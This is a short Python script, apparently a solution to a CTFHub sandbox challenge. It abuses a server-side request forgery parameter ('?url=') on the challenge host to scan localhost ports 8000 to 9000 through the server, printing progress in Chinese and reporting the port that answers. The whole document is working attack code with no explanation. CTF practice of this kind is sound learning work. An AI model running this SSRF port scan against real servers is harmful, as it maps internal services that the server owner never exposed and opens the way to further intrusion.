import requests
url = r"http://challenge-e49dc6403c20a77e.sandbox.ctfhub.com:10800/"
extra = url+'{0}'.format('?url=127.0.0.1')
time = 0
up = 9000
down = 8000
total = up -down
for i in range(down,up+1):
    new_url = url+"?url=127.0.0.1:{0}".format(i)
    r = requests.get(new_url)
    print("当前进度：{0}/{1}".format(i-down,total))
    if r.text !="":
        print(r.text)
        print("找到了，端口号为{0}".format(i))
        exit()